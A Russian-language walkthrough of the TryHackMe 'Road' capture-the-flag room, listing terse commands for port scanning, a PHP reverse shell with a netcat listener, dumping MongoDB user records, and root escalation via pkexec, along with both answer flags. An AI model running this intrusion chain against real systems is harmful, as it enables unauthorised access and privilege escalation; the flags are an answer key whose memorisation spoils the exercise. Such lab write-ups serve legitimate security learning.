[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Road](https://tryhackme.com/r/room/road) 

Всего 1 заданиe:
## Задание 1
Как обычно, получите флаг пользователя и root.

### Ответьте на вопросы ниже
Что такое флаг user.txt?
```commandline
nmap -sSCV -p- <IP>
# shell.php
nc -lvnp 4444
find / -name "user.txt" 2>dev/null
cat /home/webdeveloper/user.txt
```
```commandline
63191e4ece37523c9fe6bb62a5364d45
```
Что такое флаг root.txt?
```commandline
getent passw
ss -tulnp
mongo
show dbs
use backup
show collections;
db.user.find();
su webdeveloper
sudo -l
find / -perm -u=s 2>/dev/null
echo $$
pkttyagent --process <PID>
pkexec "/bin/bash"
cat /root/root.txt
```
```commandline
3a62d897c40a815ecbe267df2f533ac6
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)